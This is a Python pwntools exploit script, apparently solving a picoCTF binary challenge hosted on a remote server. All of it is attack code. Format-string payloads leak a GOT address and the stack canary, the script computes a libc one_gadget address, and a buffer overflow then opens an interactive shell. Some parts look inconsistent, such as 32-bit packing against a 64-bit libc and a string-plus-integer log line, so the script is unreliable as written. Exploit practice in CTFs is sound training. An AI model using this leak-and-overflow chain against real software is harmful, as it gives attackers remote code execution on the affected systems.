#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
libc = ELF("./libc_2.27-3ubuntu1.6_amd64.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("jupiter.challenges.picoctf.org", 13775)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *win+96
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def guess_num():
    for guess in range(1, -4095, -16):
        p.sendlineafter("guess?", str(guess))
        p.recvline()
        if  b"Congrats!" in p.recvline():
            log.info("hyper_guessed_number: " + guess)
            break

def set_name(name):
    p.sendlineafter("guess?", str(guess))
    p.sendlineafter("Name?", name)

def leak_address(addr):
    payload = p32(addr)
    payload += b"%7$s"
    set_name(payload)
    p.recvuntil("Congrats: ")
    p.recv(4)
    return u32(p.recv(4))

guess = -3727

puts_got_addr = leak_address(elf.got["puts"])
log.info("puts@got: " + hex(puts_got_addr))
libc_base = puts_got_addr - libc.symbols["puts"]
log.info("libc base: " + hex(libc_base))
one_gadget_addr = libc_base + 0x6749f
log.info("OneGadget@libc: " + hex(one_gadget_addr))

payload = b"%135$p"
set_name(payload)
p.recvuntil("Congrats: ")
canary = eval(p.recv(10))
log.info("canary: " + hex(canary))

payload = b'A' * 0x200
payload += p32(canary)
payload += b'B' * 4 * 3
payload += p32(one_gadget_addr)
set_name(payload)

p.interactive()
